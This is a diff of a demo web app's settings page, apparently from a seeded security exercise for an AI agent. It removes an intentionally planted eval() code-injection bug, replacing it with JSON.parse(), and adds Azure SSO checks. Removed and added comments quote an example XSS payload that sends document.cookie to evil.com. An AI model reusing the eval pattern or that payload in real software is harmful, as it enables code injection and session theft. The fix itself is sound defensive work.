@@ -10,7 +10,7 @@
 
   <div class="app">
 
-    <!-- ── Sidebar ──────────────────────────────── -->
+    <!-- ── Sidebar ──────────────────────────────────── -->
     <aside class="sidebar">
       <a href="index.html" class="sidebar-logo">
         <div class="logo-icon">N</div>
@@ -38,17 +38,19 @@
           Settings
         </a>
       </nav>
+      <!-- Azure SSO: signed-in user badge -->
+      <div id="userBadge"></div>
     </aside>
 
-    <!-- ── Main Content ─────────────────────────── -->
+    <!-- ── Main Content ───────────────────────────────── -->
     <main class="main">
 
       <div class="page-header">
         <h1>Settings</h1>
-        <p>Configure application settings and custom widgets. Paste JSON config and click "Apply" to trigger the vulnerability.</p>
+        <p>Configure application settings and custom widgets. Paste JSON config and click "Apply".</p>
       </div>
 
-      <!-- General Settings (working, no bugs) -->
+      <!-- General Settings -->
       <div class="card">
         <h2>General</h2>
         <div class="field-row">
@@ -84,7 +86,7 @@
         </div>
       </div>
 
-      <!-- Notifications (working, no bugs) -->
+      <!-- Notifications -->
       <div class="card">
         <h2>Notifications</h2>
         <div class="field-row">
@@ -106,29 +108,12 @@
         </div>
       </div>
 
-      <!-- ═══════════════════════════════════════════
-           VULNERABILITY: eval() injection
-           ═══════════════════════════════════════════
-           The "Custom Widget Config" feature uses
-           eval() to parse the user's JSON input instead
-           of JSON.parse(). This is an XSS / code
-           injection vulnerability.
-
-           Malformed JSON (e.g. just typing "hello")
-           will throw a SyntaxError via eval().
-           Malicious input like:
-             (function(){ alert('XSS') })()
-           would execute arbitrary JavaScript.
-
-           The agent should:
-           1. Identify eval() as the vulnerability
-           2. Recommend replacing with JSON.parse()
-           ═══════════════════════════════════════════ -->
+      <!-- Custom Widget Config -->
       <div class="card">
         <h2>Custom Widget Config <span class="badge">Advanced</span></h2>
         <p style="font-size: 13px; color: var(--text-secondary); margin-bottom: 16px;">
-          Paste a JSON configuration object to customize your dashboard widgets.
-          Try entering invalid JSON like <code style="background: var(--bg-primary); padding: 2px 6px; border-radius: 4px; font-family: var(--font-mono); font-size: 12px;">hello world</code> to trigger the bug.
+          Paste a JSON configuration object to customise your dashboard widgets.
+          Example: <code style="background: var(--bg-primary); padding: 2px 6px; border-radius: 4px; font-family: var(--font-mono); font-size: 12px;">{ "layout": "grid", "columns": 3 }</code>
         </p>
 
         <div class="field">
@@ -152,78 +137,69 @@
   </div>
 
 
-  <!-- ── Scripts ──────────────────────────────────── -->
+  <!-- ── Scripts ────────────────────────────────────── -->
+  <script src="https://alcdn.msauth.net/browser/2.38.3/js/msal-browser.min.js"></script>
+  <script src="js/msalConfig.js"></script>
+  <script src="js/authGuard.js"></script>
   <script src="js/errorReporter.js"></script>
   <script src="js/utils.js"></script>
+  <script src="js/auth.js"></script>
 
   <script>
+    /* ── Azure SSO: Protect this page + gate on manage_settings ── */
+    AuthGuard.protect().then(function () {
+      AuthGuard.renderUserBadge("userBadge");
+
+      // Gate the settings page to admin-only
+      var permResult = NexusAuth.checkPermission(null, "manage_settings");
+      if (!permResult.allowed) {
+        document.querySelector(".main").innerHTML =
+          '<div class="page-header"><h1>Access Denied</h1>' +
+          '<p>' + permResult.reason + '</p></div>';
+      }
+    });
+
     /* ── Intercept console.log for the demo panel ── */
     var _origLog = console.log;
     console.log = function () {
       _origLog.apply(console, arguments);
       var msg = arguments[0];
       if (typeof msg === "string" && msg.startsWith("{")) {
-        document.getElementById("consoleOutput").textContent = msg;
+        document.getElementById("consoleOutput") &&
+          (document.getElementById("consoleOutput").textContent = msg);
       }
     };
 
-
     /**
-     * ═══════════════════════════════════════════════
-     *  parseWidgetConfig(input)
-     * ═══════════════════════════════════════════════
-     *  Parses a JSON configuration string from the
-     *  user's textarea input.
+     * parseWidgetConfig(input)
+     * ────────────────────────
+     * FIX: Replaced eval() with JSON.parse().
      *
-     *  VULNERABILITY: Uses eval() instead of JSON.parse().
+     * eval() executed arbitrary JavaScript from user input, enabling
+     * code injection / XSS attacks such as:
+     *   (function(){ fetch('https://evil.com?c=' + document.cookie) })()
      *
-     *  eval() executes arbitrary JavaScript code, which
-     *  means a malicious user could inject code like:
-     *    (function(){ fetch('https://evil.com/steal?cookie=' + document.cookie) })()
-     *
-     *  For demo purposes, entering any invalid JSON
-     *  (like "hello") will throw a SyntaxError through
-     *  eval(), which triggers the error reporter.
-     *
-     *  The fix: Replace eval('(' + input + ')') with
-     *           JSON.parse(input)
-     * ═══════════════════════════════════════════════
+     * JSON.parse() only accepts valid JSON data — it cannot execute code.
      */
     function parseWidgetConfig(input) {
-      // VULNERABILITY: Using eval() to parse user input
-      // This allows arbitrary code execution
-      var config = eval('(' + input + ')');
-      return config;
+      // FIX: Use JSON.parse() instead of eval() — safe, data-only parsing
+      return JSON.parse(input);
     }
 
-
-    /**
-     * ═══════════════════════════════════════════════
-     *  applyWidgetConfig()
-     * ═══════════════════════════════════════════════
-     *  Reads the textarea, parses the config using
-     *  the vulnerable parseWidgetConfig(), and applies it.
-     * ═══════════════════════════════════════════════
-     */
     function applyWidgetConfig() {
+      var input;
       try {
-        var input = document.getElementById("widgetConfig").value;
+        input = document.getElementById("widgetConfig").value;
 
-        if (!input.trim()) {
-          showToast("Please enter a configuration.", "error");
-          return;
-        }
+        if (!input.trim()) { showToast("Please enter a configuration.", "error"); return; }
 
-        // VULNERABLE: Uses eval() internally
         var config = parseWidgetConfig(input);
 
-        // Validate the parsed config has expected structure
-        if (!config || typeof config !== "object") {
+        if (!config || typeof config !== "object" || Array.isArray(config)) {
           showToast("Invalid config: must be a JSON object.", "error");
           return;
         }
 
-        // This would apply the config if parsing succeeds:
         var keys = Object.keys(config);
         showToast("Widget config applied — " + keys.length + " setting(s) updated: " + keys.join(", "), "success");
 
@@ -232,29 +208,24 @@
           error: e,
           source_file: "settings.html",
           priority: "high",
-          title: "Widget config parsing failed — unsafe eval on user input",
+          title: "Widget config parsing failed — invalid JSON",
           context: {
             module: "SettingsService",
             action: "applyWidgetConfig",
-            inputs: {
-              rawInput: input,
-              inputLength: input ? input.length : 0
-            }
+            inputs: { rawInput: input, inputLength: input ? input.length : 0 }
           }
         });
         showToast("Error: " + e.message + " — reported to monitoring.", "error");
       }
     }
 
-
-    /* ── Reset form ────────────────────────────── */
     function resetConfigForm() {
       document.getElementById("widgetConfig").value = "";
-      document.getElementById("consoleOutput").innerHTML =
-        '<span class="empty">Waiting for an error to be reported...</span>';
+      document.getElementById("consoleOutput") &&
+        (document.getElementById("consoleOutput").innerHTML =
+          '<span class="empty">Waiting for an error to be reported...</span>');
     }
 
-    /* ── Toast helper ──────────────────────────── */
     function showToast(message, type) {
       var existing = document.querySelector(".toast");
       if (existing) existing.remove();
